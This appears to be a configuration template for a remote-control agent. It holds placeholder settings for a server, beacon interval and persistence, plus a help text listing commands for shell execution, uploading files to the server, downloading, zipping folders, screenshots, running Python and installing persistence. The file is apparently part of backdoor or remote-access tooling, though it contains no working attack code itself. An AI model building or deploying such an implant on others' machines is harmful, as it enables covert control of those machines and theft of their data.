SERVER = "__SERVER__"
HELLO_INTERVAL = __HELLO_INTERVAL__
IDLE_TIME = __IDLE_TIME__
MAX_FAILED_CONNECTIONS = __MAX_FAILED_CONNECTIONS__
PERSIST = __PERSIST__
HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

python <command|file>
Runs a Python command or local file.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.
"""
